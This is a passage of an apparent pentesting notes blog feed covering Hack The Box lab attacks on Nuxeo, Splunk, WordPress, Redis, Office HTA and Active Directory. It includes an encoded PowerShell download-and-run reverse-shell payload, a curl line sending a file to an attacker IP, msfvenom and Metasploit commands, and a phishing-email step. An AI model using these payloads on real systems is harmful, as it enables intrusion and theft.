commandhttp://hancliffe/maintenance/..;/login.jsp/pwn$%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22powershell%20-encodedcommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA=%22,null).waitFor()%7D.xhtmlReferences  Wikipedia  GitHub - nuxeo/nuxeo: Content management platform to build modern business applications",
            "content_html": "<h2 id=\"oveview\">Oveview</h2><p><img src=\"/spindel/assets/Nuxeo/CAP-dashboard.png\" alt=\"\" /></p><ul>  <li>Collaboration system</li>  <li>Tech stack    <ul>      <li>Tomcat</li>      <li>Elasticsearch</li>      <li>DB (PostgreSQL, Mysql)</li>    </ul>  </li></ul><h2 id=\"version-detection\">Version Detection</h2><ul>  <li>You can see copyright as well as version infromation at the bottom of login page</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Version is 10.2</span>Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2</code></pre></div></div><h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Default</span>Administrator:Administrator<span class=\"c\"># Some DB Users to try</span>nuxeo</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nuxeo config. You can see DB passwords here.</span>C:<span class=\"se\">\\p</span>rogramdata<span class=\"se\">\\n</span>uxeo<span class=\"se\">\\c</span>onf<span class=\"se\">\\n</span>uxeo.conf<span class=\"c\"># Some tomcat config</span>conf/<span class=\"c\"># User settings?</span>~/.nxshellC:<span class=\"se\">\\u</span>sers<span class=\"se\">\\s</span>vc_account<span class=\"se\">\\.</span>nxshell<span class=\"se\">\\h</span>istoryC:<span class=\"se\">\\u</span>sers<span class=\"se\">\\s</span>vc_account<span class=\"se\">\\.</span>nxshell<span class=\"se\">\\s</span>hell.properties</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>/nuxeo/nuxeo/login.jsp/nxserver/nxstartup.faces</code></pre></div></div><h2 id=\"interesting-database-tables\">Interesting Database Tables</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">users</span>digestauthcontent<span class=\"nb\">groups</span>userinfonote</code></pre></div></div><h2 id=\"interesting-elasticearch-data\">Interesting Elasticearch Data</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"s1\">'http://localhost:9200/nuxeo-audit/_search?pretty=true'</span>curl <span class=\"s1\">'http://localhost:9200/nuxeo/_search?pretty=true'</span></code></pre></div></div><h2 id=\"vulnerabilities-attacks-and-exploits\">Vulnerabilities, Attacks and Exploits</h2><ul>  <li><a href=\"https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html\">Orange: How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System</a></li>  <li><a href=\"https://github.com/mpgn/CVE-2018-16341\">Nuxeo 10 Authentication Bypass and RCE using SSTI</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># HTB Hancliffe payload. Take note there is a URI parsing</span><span class=\"c\"># vulnerability that's why there is a `/maintenance/..;/`</span>http://hancliffe/maintenance/..<span class=\"p\">;</span>/login.jsp/pwn<span class=\"nv\">$%</span>7B7+7%7D.xhtml<span class=\"c\"># Another payload but with powershell encoded command</span>http://hancliffe/maintenance/..<span class=\"p\">;</span>/login.jsp/pwn<span class=\"nv\">$%</span>7B%22%22.getClass<span class=\"o\">()</span>.forName<span class=\"o\">(</span>%22java.lang.Runtime%22<span class=\"o\">)</span>.getMethod<span class=\"o\">(</span>%22getRuntime%22,null<span class=\"o\">)</span>.invoke<span class=\"o\">(</span>null,null<span class=\"o\">)</span>.exec<span class=\"o\">(</span>%22powershell%20-encodedcommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA<span class=\"o\">=</span>%22,null<span class=\"o\">)</span>.waitFor<span class=\"o\">()</span>%7D.xhtml</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://en.wikipedia.org/wiki/Nuxeo\">Wikipedia</a></li>  <li><a href=\"https://github.com/nuxeo/nuxeo\">GitHub - nuxeo/nuxeo: Content management platform to build modern business applications</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/19/nuxeo",
            
            
            
            "tags": ["rce","cms","enum","java","ssti","web"],
            
            "date_published": "2022-05-19T00:00:00+08:00",
            "date_modified": "2022-05-19T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/18/splunk-wispherer",
            "title": "Splunk Wispherer",
            "summary": "Splunk Wispherer",
            "content_text": "OverviewAuthenticated attacker can send malicuous package to splunk API and execute it. This can be done remotely or locally.Using python3 on local exploit  Convert this exploit into python3# replace functionsraw_input() --&gt; input()print \"some text\" --&gt; print(\"some text\")  Open netcat listener on attacker machine to receive the output  Upload exploit to victim machine and runpython3 PySplunkWhisperer2_local.py --port 8089 --username shaun --password Guitar123 --payload \"curl -F 'data=@/root/root.txt' http://10.10.14.26:4444\"  Sample executionReferences  Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>Authenticated attacker can send malicuous package to splunk API and execute it. This can be done remotely or locally.</p><h1 id=\"using-python3-on-local-exploit\">Using python3 on local exploit</h1><ul>  <li>Convert this <a href=\"https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local.py\">exploit</a> into python3</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># replace functions</span>raw_input<span class=\"o\">()</span> <span class=\"nt\">--</span><span class=\"o\">&gt;</span> input<span class=\"o\">()</span>print <span class=\"s2\">\"some text\"</span> <span class=\"nt\">--</span><span class=\"o\">&gt;</span> print<span class=\"o\">(</span><span class=\"s2\">\"some text\"</span><span class=\"o\">)</span></code></pre></div></div><ul>  <li>Open netcat listener on attacker machine to receive the output</li>  <li>Upload exploit to victim machine and run</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python3 PySplunkWhisperer2_local.py <span class=\"nt\">--port</span> 8089 <span class=\"nt\">--username</span> shaun <span class=\"nt\">--password</span> Guitar123 <span class=\"nt\">--payload</span> <span class=\"s2\">\"curl -F 'data=@/root/root.txt' http://10.10.14.26:4444\"</span></code></pre></div></div><ul>  <li>Sample execution</li></ul><p><img src=\"/spindel/assets/Splunk%20Wispherer/E8F96602-F53E-48EB-9F78-BE72A20830F5.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Splunk%20Wispherer/86A9D789-E1E0-42DB-B3AA-9A22562844E1.png\" alt=\"\" /></p><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/\">Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/18/splunk-wispherer",
            
            
            
            "tags": ["rce","devops"],
            
            "date_published": "2022-05-18T00:00:00+08:00",
            "date_modified": "2022-05-18T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/17/wordpress-5-rce",
            "title": "Wordpress 5 RCE",
            "summary": "Wordpress 5 RCE",
            "content_text": "This attack is very complicated and hard to understand for beginners  WordPress 5.0.0 Remote Code Execution  The detailed analysis of WordPress 5.0 RCE - by Knownsec 404 team  Analysis of a WordPress Remote Code Execution Attack - Pentest-Tools.com Blog  CVE-2019-8943 exploit by v0lck3r  Metasploit Commandsuse exploit/multi/http/wp_crop_rceset rhosts 10.10.188.55set username kwheelset password cutiepie1set lhost tun0",
            "content_html": "<p><strong>This attack is very complicated and hard to understand for beginners</strong></p><ul>  <li><a href=\"https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips\">WordPress 5.0.0 Remote Code Execution</a></li>  <li><a href=\"https://medium.com/@knownsec404team/the-detailed-analysis-of-wordpress-5-0-rce-a171ed719681\">The detailed analysis of WordPress 5.0 RCE - by Knownsec 404 team</a></li>  <li><a href=\"https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942/\">Analysis of a WordPress Remote Code Execution Attack - Pentest-Tools.com Blog</a></li>  <li><a href=\"https://github.com/v0lck3r/CVE-2019-8943.git\">CVE-2019-8943 exploit by v0lck3r</a></li>  <li>Metasploit Commands</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>use exploit/multi/http/wp_crop_rce<span class=\"nb\">set </span>rhosts 10.10.188.55<span class=\"nb\">set </span>username kwheel<span class=\"nb\">set </span>password cutiepie1<span class=\"nb\">set </span>lhost tun0</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/05/17/wordpress-5-rce",
            
            
            
            "tags": ["rce","wordpress","foothold","web"],
            
            "date_published": "2022-05-17T00:00:00+08:00",
            "date_modified": "2022-05-17T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/14/hta-handler-rce-cve20170199",
            "title": "HTA Handler RCE (CVE-2017-0199)",
            "summary": "HTA Handler RCE (CVE-2017-0199)",
            "content_text": "Overview  Attacker sends document with OLE to victim  Victim clicks document (or download attachment from email)  Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of mshta.exe.Exploits  CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler - Mandiant - using RTF and Word documnets  CVE-2017-0199: New Malware Abuses PowerPoint SlidesTools  CVE-2017-0199 Python exploit toolkit  Metasploit# Generate document and run webservermsfconsole -x \"use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run\"# Send generated document to victim and wait for the reverse# connection in metasploitsendEmail -t nico@megabank.com -f hacker@kali.com -s reel:25 -u Procedures -o tls=no -a /home/kali/.msf4/local/Procedures.doc -m \"See attachment for procedures\"TroubleshootingThe python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a GET request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.Alternatives  You can generate HTA file via this methods# msfvenommsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta# via nishanghttps://www.youtube.com/watch?v=ob9SgtFm6_g&amp;t=794sReferences  HTB Reel  CVE-2017-11826 Exploited in the Wild with Politically Themed RTF Document  - maybe also related as this is an RTF exploit",
            "content_html": "<h2 id=\"overview\">Overview</h2><ol>  <li>Attacker sends document with OLE to victim</li>  <li>Victim clicks document (or download attachment from email)</li>  <li>Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of <code class=\"language-plaintext highlighter-rouge\">mshta.exe</code>.</li></ol><h2 id=\"exploits\">Exploits</h2><ul>  <li><a href=\"https://www.mandiant.com/resources/cve-2017-0199-hta-handler\">CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler - Mandiant</a> - using RTF and Word documnets</li>  <li><a href=\"https://www.trendmicro.com/en_sg/research/17/h/cve-2017-0199-new-malware-abuses-powerpoint-slide-show.html\">CVE-2017-0199: New Malware Abuses PowerPoint Slides</a></li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/bhdresh/CVE-2017-0199\">CVE-2017-0199 Python exploit toolkit</a></li></ul><p><img src=\"/spindel/assets/HTA%20Handler%20RCE%20(CVE-2017-0199)/Scenario1.jpg\" alt=\"\" /></p><ul>  <li>Metasploit</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Generate document and run webserver</span>msfconsole <span class=\"nt\">-x</span> <span class=\"s2\">\"use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run\"</span><span class=\"c\"># Send generated document to victim and wait for the reverse</span><span class=\"c\"># connection in metasploit</span>sendEmail <span class=\"nt\">-t</span> nico@megabank.com <span class=\"nt\">-f</span> hacker@kali.com <span class=\"nt\">-s</span> reel:25 <span class=\"nt\">-u</span> Procedures <span class=\"nt\">-o</span> <span class=\"nv\">tls</span><span class=\"o\">=</span>no <span class=\"nt\">-a</span> /home/kali/.msf4/local/Procedures.doc <span class=\"nt\">-m</span> <span class=\"s2\">\"See attachment for procedures\"</span></code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><p>The python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a <code class=\"language-plaintext highlighter-rouge\">GET</code> request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?</p><p>From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.</p><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>You can generate HTA file via this methods</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># msfvenom</span>msfvenom <span class=\"nt\">-p</span> windows/shell_reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.10.14.3 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>443 <span class=\"nt\">-f</span> hta-psh <span class=\"nt\">-o</span> msfv.hta<span class=\"c\"># via nishang</span>https://www.youtube.com/watch?v<span class=\"o\">=</span>ob9SgtFm6_g&amp;t<span class=\"o\">=</span>794s</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Reel</li>  <li><a href=\"https://www.fortinet.com/blog/threat-research/cve-2017-11826-exploited-in-the-wild-with-politically-themed-rtf-document\">CVE-2017-11826 Exploited in the Wild with Politically Themed RTF Document</a>  - maybe also related as this is an RTF exploit</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/14/hta-handler-rce-cve20170199",
            
            
            
            "tags": ["rce","windows","foothold"],
            
            "date_published": "2022-05-14T00:00:00+08:00",
            "date_modified": "2022-05-14T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/08/redis-4-and-5-unauthenticated-rce",
            "title": "Redis 4 and 5 Unauthenticated RCE",
            "summary": "Redis 4 and 5 Unauthenticated RCE",
            "content_text": "OverviewYou can deploy a rougue redis server and make use of its replication capabilities to execute arbritrary commands inside the server.::NOTE::Looks like this is for linux onlySteps  Download this exploit  Follow instruction on how to compile exp.so  Run it from attacker machine# 10.10.70.254 - victim ip# 10.11.40.33 - attacker ippython3 redis-master.py -r 10.10.70.254 -p 6379 -L 10.11.40.33 -P 8888 -f RedisModulesSDK/exp.so -c \"id\"  Sample output...truncated...# Clientsconnected_clients:1client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0uid=112(redis) gid=123(redis) groups=123(redis)Notes  If you use reverse shell as your command, this may break the redis for some reasons. So you only have 1 chance to do it because next time it would not work.  This might not work if commands such as MODULE is not available on the target redis instanceReferences  https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf  Pavel Toporkov - Redis post-exploitation",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>You can deploy a rougue redis server and make use of its replication capabilities to execute arbritrary commands inside the server.</p><p>::NOTE::</p><p>Looks like this is for linux only</p><p><img src=\"/spindel/assets/Redis%204%20and%205%20Unauthenticated%20RCE/357378FF-379F-4EFA-81F7-4A12EC11EEFC.png\" alt=\"\" /></p><h1 id=\"steps\">Steps</h1><ul>  <li>Download this <a href=\"https://github.com/vulhub/redis-rogue-getshell\">exploit</a></li>  <li>Follow instruction on how to compile <code class=\"language-plaintext highlighter-rouge\">exp.so</code></li>  <li>Run it from attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 10.10.70.254 - victim ip</span><span class=\"c\"># 10.11.40.33 - attacker ip</span>python3 redis-master.py <span class=\"nt\">-r</span> 10.10.70.254 <span class=\"nt\">-p</span> 6379 <span class=\"nt\">-L</span> 10.11.40.33 <span class=\"nt\">-P</span> 8888 <span class=\"nt\">-f</span> RedisModulesSDK/exp.so <span class=\"nt\">-c</span> <span class=\"s2\">\"id\"</span></code></pre></div></div><ul>  <li>Sample output</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>...truncated...# Clientsconnected_clients:1client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0uid=112(redis) gid=123(redis) groups=123(redis)</code></pre></div></div><h1 id=\"notes\">Notes</h1><ul>  <li>If you use reverse shell as your command, this may break the redis for some reasons. So you only have 1 chance to do it because next time it would not work.</li>  <li>This might not work if commands such as <code class=\"language-plaintext highlighter-rouge\">MODULE</code> is not available on the target redis instance</li></ul><h1 id=\"references\">References</h1><ul>  <li>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</li>  <li><a href=\"https://www.youtube.com/watch?v=Jmv-0PnoJ6c\">Pavel Toporkov - Redis post-exploitation</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/08/redis-4-and-5-unauthenticated-rce",
            
            
            
            "tags": ["rce","foothold"],
            
            "date_published": "2022-05-08T00:00:00+08:00",
            "date_modified": "2022-05-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/03/lsa-secrets",
            "title": "LSA Secrets",
            "summary": "LSA Secrets",
            "content_text": "OverviewLSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows. LSA is designed for managing a system’s local security policy, auditing, authenticating, logging users on to the system, storing private data. Users’ and system’s sensitive data is stored in secrets. Access to all secret data is available to system only.LSASS (Local Security Authority Subsystem Service) is the service corresponding to this and it stores the credentials in memory on behalf of user that has an active session.LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).  Logs on to a local session or RDP session on the computer  Runs a process using RunAs  Runs an active Windows service on the computer  Creates a scheduled task or batch job.  Runs PsExec with explicit creds, such as PsExec \\\\server -u user -p pwd cmd  Uses WinRM with CredSSP.References  Dumping LSA Secrets - Red Teaming Experiments  Windows LSA secrets  Decrypting LSA Secrets",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>LSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows. LSA is designed for managing a system’s local security policy, auditing, authenticating, logging users on to the system, storing private data. Users’ and system’s sensitive data is stored in secrets. Access to all secret data is available to system only.</p><p>LSASS (Local Security Authority Subsystem Service) is the service corresponding to this and it stores the credentials in memory on behalf of user that has an active session.</p><p>LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.</p><p>Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).</p><ul>  <li>Logs on to a local session or RDP session on the computer</li>  <li>Runs a process using RunAs</li>  <li>Runs an active Windows service on the computer</li>  <li>Creates a scheduled task or batch job.</li>  <li>Runs PsExec with explicit creds, such as <code class=\"language-plaintext highlighter-rouge\">PsExec \\\\server -u user -p pwd cmd</code></li>  <li>Uses WinRM with CredSSP.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets\">Dumping LSA Secrets - Red Teaming Experiments</a></li>  <li><a href=\"https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=23\">Windows LSA secrets</a></li>  <li><a href=\"http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html\">Decrypting LSA Secrets</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/03/lsa-secrets",
            
            
            
            "tags": ["windows","crypto"],
            
            "date_published": "2022-05-03T00:00:00+08:00",
            "date_modified": "2022-05-03T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/01/dns-domain-name-system",
            "title": "DNS (Domain Name System)",
            "summary": "DNS (Domain Name System)",
            "content_text": "Interesting Files# bind key/etc/bind/ddns.keyCommands# interactivenslookup&gt; server 10.10.10.161[...redacted...]&gt; 127.0.0.1           # lookup localhost[...redacted...]&gt; 127.0.0.2           # some systems have this[...redacted...]&gt; 10.10.10.161        # lookup its ip[...redacted...]Zone Transfer  Usually you can do this if DNS is running via TCP instead of UDP  You need a domain name in order for this to work  You can have clues on how many domains it holds based from failed transfer output$ dig axfr @mantis                  [...redacted...]; (1 server found)[...redacted...]$Reverse DNS# Checks loopback addresses - looks like command is no longer# validdnsrecon -n 10.10.10.83 -r 10.0.0.0/8 --db olympus.dbdnsrecon -n 10.10.10.83 -r 172.16.0.0/12 --db olympus.dbdnsrecon -n 10.10.10.83 -r 192.168.0.0/16 --db olympus.dbDynamic DNS (no-ip)# adding record setting a specific IPcurl 'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb&amp;myip=10.10.14.45'# adding a record using IP by clientcurl 'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb'  DDNS server implementations          php      php 2      perl      golang        API                                                      [Perform Update (RA-API)              Dyn Help Center](https://help.dyn.com/remote-access-api/perform-update/)                                          Tools  GitHub - hash3liZer/Subrake: A Subdomain Enumeration and Validation tool for Bug Bounty and Pentesters.References  53 - Pentesting DNS - HackTricks f",
            "content_html": "<h2 id=\"interesting-files\">Interesting Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># bind key</span>/etc/bind/ddns.key</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># interactive</span>nslookup<span class=\"o\">&gt;</span> server 10.10.10.161<span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 127.0.0.1           <span class=\"c\"># lookup localhost</span><span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 127.0.0.2           <span class=\"c\"># some systems have this</span><span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 10.10.10.161        <span class=\"c\"># lookup its ip</span><span class=\"o\">[</span>...redacted...]</code></pre></div></div><h2 id=\"zone-transfer\">Zone Transfer</h2><ul>  <li>Usually you can do this if DNS is running via TCP instead of UDP</li>  <li>You need a domain name in order for this to work</li>  <li>You can have clues on how many domains it holds based from failed transfer output</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>dig axfr @mantis                  <span class=\"o\">[</span>...redacted...]<span class=\"p\">;</span> <span class=\"o\">(</span>1 server found<span class=\"o\">)</span><span class=\"o\">[</span>...redacted...]<span class=\"err\">$</span></code></pre></div></div><h2 id=\"reverse-dns\">Reverse DNS</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Checks loopback addresses - looks like command is no longer</span><span class=\"c\"># valid</span>dnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 10.0.0.0/8 <span class=\"nt\">--db</span> olympus.dbdnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 172.16.0.0/12 <span class=\"nt\">--db</span> olympus.dbdnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 192.168.0.0/16 <span class=\"nt\">--db</span> olympus.db</code></pre></div></div><h2 id=\"dynamic-dns-no-ip\">Dynamic DNS (no-ip)</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># adding record setting a specific IP</span>curl <span class=\"s1\">'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb&amp;myip=10.10.14.45'</span><span class=\"c\"># adding a record using IP by client</span>curl <span class=\"s1\">'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb'</span></code></pre></div></div><ul>  <li>DDNS server implementations    <ul>      <li><a href=\"https://www.yingtongli.me/blog/2017/04/18/dynamic-dns.html\">php</a></li>      <li><a href=\"https://github.com/kbabioch/php-ddns/blob/master/update.php\">php 2</a></li>      <li><a href=\"https://github.com/randomnoun/ddserver\">perl</a></li>      <li><a href=\"https://github.com/benjaminbear/docker-ddns-server\">golang</a></li>    </ul>  </li>  <li>API    <ul>      <li>        <table>          <tbody>            <tr>              <td>[Perform Update (RA-API)</td>              <td>Dyn Help Center](https://help.dyn.com/remote-access-api/perform-update/)</td>            </tr>          </tbody>        </table>      </li>    </ul>  </li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/hash3liZer/Subrake\">GitHub - hash3liZer/Subrake: A Subdomain Enumeration and Validation tool for Bug Bounty and Pentesters.</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-dns\">53 - Pentesting DNS - HackTricks</a> f</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/01/dns-domain-name-system",
            
            
            
            "tags": ["enum","dns","network"],
            
            "date_published": "2022-05-01T00:00:00+08:00",
            "date_modified": "2022-05-01T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/30/ad-recycle-bin",
            "title": "AD Recycle Bin",
            "summary": "AD Recycle Bin",
            "content_text": "OverviewAttacker can retrieve juicy information from deleted AD Objects if he had gained access to a low-privileged user that has access in deleted AD objects.Environment Setup and Requirements  Low privileged user that can access deleted AD objectsSteps  Check current permission*Evil-WinRM* PS C:\\users\\arksvc&gt; whoami /all | findstr /i recycleCASCADE\\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group*Evil-WinRM* PS C:\\users\\arksvc&gt;   Check if you can see deleted objectsGet-ADObject -filter 'isDeleted -eq $true -and name -ne \"Deleted Objects\"' -includeDeletedObjects  Find juicy information45689883479503*Evil-WinRM* PS C:\\users&gt; Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * | findstr cascadeLegacyPwdcascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz*Evil-WinRM* PS C:\\users&gt; References  HTB Cascade                              [Active Directory Recycle Bin          Recover Deleted AD Object          AD Deleted Objects](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)                      ACTIVE DIRECTORY OBJECT RECOVERY (RECYCLE BIN)",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can retrieve juicy information from deleted AD Objects if he had gained access to a low-privileged user that has access in deleted AD objects.</p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>Low privileged user that can access deleted AD objects</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Check current permission</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users\\arksvc</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">whoami</span><span class=\"w\"> </span><span class=\"nx\">/all</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">findstr</span><span class=\"w\"> </span><span class=\"nx\">/i</span><span class=\"w\"> </span><span class=\"nx\">recycle</span><span class=\"w\"></span><span class=\"n\">CASCADE\\AD</span><span class=\"w\"> </span><span class=\"nx\">Recycle</span><span class=\"w\"> </span><span class=\"nx\">Bin</span><span class=\"w\">                      </span><span class=\"nx\">Alias</span><span class=\"w\">            </span><span class=\"nx\">S-1-5-21-3332504370-1206983947-1165150453-1119</span><span class=\"w\"> </span><span class=\"nx\">Mandatory</span><span class=\"w\"> </span><span 